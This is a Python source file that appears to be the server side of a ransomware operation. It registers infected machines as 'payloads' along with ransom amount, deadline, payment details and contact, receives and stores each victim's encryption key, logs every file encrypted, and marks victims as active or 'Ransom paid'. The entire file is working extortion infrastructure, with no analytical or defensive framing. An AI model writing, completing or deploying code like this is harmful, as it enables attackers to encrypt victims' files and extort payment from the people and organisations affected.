from secured_protocol.src.service.baseserver import BaseServer
from .models.database import Database
from .models.pldata import PayloadData, STATUS_ACTIVE, STATUS_PAID
import json

FILE_ENCRYPTED = 0
ENCRYPTION_DONE = 1

class Server(BaseServer):
    """
    The server registers active payload and stores their current status and encryption data.
    """
    def __init__(self):
        BaseServer.__init__(self)
        self.database = Database()

    def handle_session(self, session):
        """
        Handle a session with connected payload
        :param session: Session (secured_protocol lib)
        :return: None
        """
        payload_data = session.receive()
        payload_data = json.loads(payload_data.get_data())
        payload = self.database.get(payload_data['id'])
        if payload:
            if payload.is_active():
                # continue with active payload
                self.handle_active_payload(payload, session)
            else:
                # handle inactive payloads
                self.handle_inactive_payload(payload, session)
        else:
            # register new unregistered payload
            self.handle_unregistered_payload(payload_data, session)

    def handle_active_payload(self, payload, session):
        """
        Handles connected active payloads and sending them with their recent updated data
        :param payload: PayloadData
        :param session: Session
        :return: None
        """
        payload_data = {"active":  payload.is_active(),
                        "status": payload.status,
                        "files": payload.files,
                        "time": payload.get_remaining_time()}

        session.send_text(json.dumps(payload_data))
        session.send_bytes(payload.cipher_key)

    def handle_inactive_payload(self, payload, session):
        """
        Handles inactive payloads
        :param payload: PayloadData
        :param session: Session
        :return: None
        """
        if payload.status == STATUS_ACTIVE:
            session.send_text('{"action":2}')
            self.handle_encryption(payload, session)
        elif payload.status == STATUS_PAID:
            session.send_text('{"active": false, "status":"Ransom paid"}')

    def handle_unregistered_payload(self, payload_data, session):
        """
        Registers new payloads
        :param payload_data: dict
        :param session: Session
        :return:
        """
        payload = PayloadData(payload_data['id'],
                              payload_data['payment'],
                              payload_data['timeLimit'],
                              payload_data['paymentDetails'],
                              payload_data['contact'])
        self.database.add(payload)
        text = '{"active": false, "status":"Unregistered"}'
        session.send_text(text)
        self.handle_encryption(payload, session)

    def handle_encryption(self, payload, session):
        """
        Handles payload's encryption process
        :param payload: PayloadData
        :param session: Session
        :return: None
        """
        # receives cipher key from payload
        cipher_key = session.receive().get_data()
        payload.set_cipher_key(cipher_key)
        # listens for encryption updates
        while True:
            data = json.loads(session.receive().get_data())
            # if total encryption is done
            if data['action'] ==  ENCRYPTION_DONE:
                payload.activate(data['date'])
                break
            # if a file was encrypted
            elif data['action'] == FILE_ENCRYPTED:
                # updates payload'd file list
                payload.add_encrypted_file(data['file'])